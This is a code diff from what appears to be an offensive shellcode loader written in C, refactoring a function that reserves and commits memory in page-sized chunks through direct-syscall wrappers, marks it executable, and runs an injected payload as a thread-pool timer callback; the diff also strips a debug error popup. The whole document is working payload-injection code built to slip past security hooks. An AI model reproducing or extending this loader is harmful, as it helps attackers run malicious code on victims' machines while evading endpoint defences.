@@ -1,7 +1,9 @@
 #include "inject.h"
 
-BOOL Inject(PBYTE pPayloadBuffer, SIZE_T sPayloadSize, PBYTE* pInjectedPayload)
+BOOL Inject(PBYTE* pInjectedPayload)
 {
+    PBYTE pPayloadBuffer = pPayload;
+    SIZE_T sPayloadSize = sSize;
     NTSTATUS	STATUS			    = 0x00;
     SIZE_T		sNewPayloadSize		= SET_TO_MULTIPLE_OF_4096(sPayloadSize);
     SIZE_T      sChunkSize		    = PAGE_SIZE;
@@ -10,10 +12,10 @@ BOOL Inject(PBYTE pPayloadBuffer, SIZE_T sPayloadSize, PBYTE* pInjectedPayload)
     PVOID		pAddress		    = NULL;
     PVOID       pTmpAddress		    = NULL;
     PBYTE		pTmpPayload		    = NULL;
-
+    SIZE_T      dwNumberOfbytes     = (SIZE_T) NULL;
     sNewPayloadSize = sNewPayloadSize + PAGE_SIZE;
-
-    if ((STATUS = Sw3NtAllocateVirtualMemory(NtCurrentProcess(), &pAddress, 0, &sNewPayloadSize, MEM_RESERVE, PAGE_READONLY)) != 0)
+    STATUS = Sw3NtAllocateVirtualMemory(NtCurrentProcess(), &pAddress, 0, &sNewPayloadSize, MEM_RESERVE, PAGE_READONLY);
+    if (STATUS != 0)
     {
         return FALSE;
     }
@@ -24,7 +26,8 @@ BOOL Inject(PBYTE pPayloadBuffer, SIZE_T sPayloadSize, PBYTE* pInjectedPayload)
 
     for (DWORD i = 0; i < ii; i++)
     {
-        if ((STATUS = Sw3NtAllocateVirtualMemory(NtCurrentProcess(), &pTmpAddress, 0, &sChunkSize, MEM_COMMIT, PAGE_READWRITE)) != 0)
+        STATUS = Sw3NtAllocateVirtualMemory(NtCurrentProcess(), &pTmpAddress, 0, &sChunkSize, MEM_COMMIT, PAGE_READWRITE);
+        if (STATUS != 0)
         {
             return FALSE;
         }
@@ -35,7 +38,8 @@ BOOL Inject(PBYTE pPayloadBuffer, SIZE_T sPayloadSize, PBYTE* pInjectedPayload)
 
     for (DWORD i = 0; i < ii; i++)
     {
-        if ((STATUS = Sw3NtProtectVirtualMemory(NtCurrentProcess(), &pTmpAddress, &sChunkSize, PAGE_EXECUTE_READWRITE, &dwOldPermissions)) != 0)
+        STATUS = Sw3NtProtectVirtualMemory(NtCurrentProcess(), &pTmpAddress, &sChunkSize, PAGE_EXECUTE_READWRITE, &dwOldPermissions);
+        if (STATUS != 0)
         {
             return FALSE;
         }
@@ -76,11 +80,11 @@ VOID Execute(PVOID pInjectedPayload)
     {
         return;
     }
+
     InitializeThreadpoolEnvironment(&tpCallbackEnv);
 
     if (!(ptpTimer = pCreateThreadpoolTimer((PTP_TIMER_CALLBACK)pInjectedPayload, NULL, &tpCallbackEnv)))
     {
-        MessageBoxA(NULL, "ERROR", "ERROR", MB_OK);
         return;
     }
 
@@ -89,6 +93,5 @@ VOID Execute(PVOID pInjectedPayload)
     FileDueTime.dwLowDateTime	= ulDueTime.LowPart;
 
     pSetThreadpoolTimer(ptpTimer, &FileDueTime, 0x00, 0x00);
-
     pWaitForSingleObject((HANDLE)-1, INFINITE);
 }
